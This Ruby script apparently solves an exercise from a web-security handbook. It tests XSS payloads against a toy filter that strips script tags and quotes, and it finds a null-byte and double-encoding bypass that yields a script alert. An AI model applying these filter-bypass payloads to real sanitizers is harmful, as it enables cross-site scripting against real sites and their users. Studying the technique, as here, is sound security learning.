require "uri"

# Solution to problem from page 37 (p73 in PDF) of Web application hacker
# handbook

# scrub method as specified by the problem
def scrub(str)
  im = str.gsub(/<script>/, "") # 1. remove <script>
  im = im[0...50]               # 2. truncate to first 50 chars
  im = im.gsub(/("|')/, "")     # 3. remove " and '
  im = URI.unescape(im)         # 4. URL decode the input
  im
end

def recursive_scrub(str)
  scrubbed = ""
  loop do
    scrubbed = scrub(str)
    break if scrubbed.length == str.length
    str = scrubbed
  end
  scrubbed
end

desired_malicious_output = '><script>alert("foo")</script>'

inputs = [
  # desired output without changes does not work
  # "><script>alert('foo')</script>",

  # URI encode the whole thing does not work
  # "%3E%3Cscript%3Ealert('foo')%3C/script%3E",

  # gets <script> through
  # "><%00script>alert('foo')</script>",

  # does not work
  # ">%3Cscript%3Ealert('foo')</script>",

  # embed <script> does not work
  # "><<script>script>alert('foo')</script>"

  # ASCII table
  # %25 = %
  # %22 = "

  # encode " somehow so it passes step 3
  # need to somehow preserve length
  "><%00script>alert(%2522foo%2522)</script>",

  #
  # %00 goes from 3 chars to 0 chars
  # %25 goes from 3 chars to 1 char
  #
  # I need to keep the char count the same from start to finish
  '><%00script>alert(%22foo%22)</script>',
]

inputs.each do |input|
  output = recursive_scrub(input)
  puts "IN: " + input
  puts "OUT: " + output
  if output == desired_malicious_output
    puts "WINNER"
    break
  else
    puts "NOPE"
  end
  puts "=============="
end
